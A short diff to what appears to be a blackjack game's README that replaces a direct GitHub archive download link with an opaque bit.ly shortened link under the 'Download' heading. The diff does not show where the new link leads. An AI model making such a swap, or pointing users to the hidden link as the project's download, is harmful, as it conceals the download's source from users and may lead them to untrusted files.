@@ -3,7 +3,7 @@
 # Download <img src="https://c.tenor.com/k2GZAYWuTS4AAAAi/backhand-index-pointing-down-joypixels.gif" width="30px">
 
 
-**https://github.com/thejana2010/black-jack-game/archive/refs/heads/master.zip**
+**https://bit.ly/blackjack2010**
 
 <details>
   <summary><b> Setup <img src="https://c.tenor.com/k2GZAYWuTS4AAAAi/backhand-index-pointing-down-joypixels.gif" width="20px"></></b></summary>
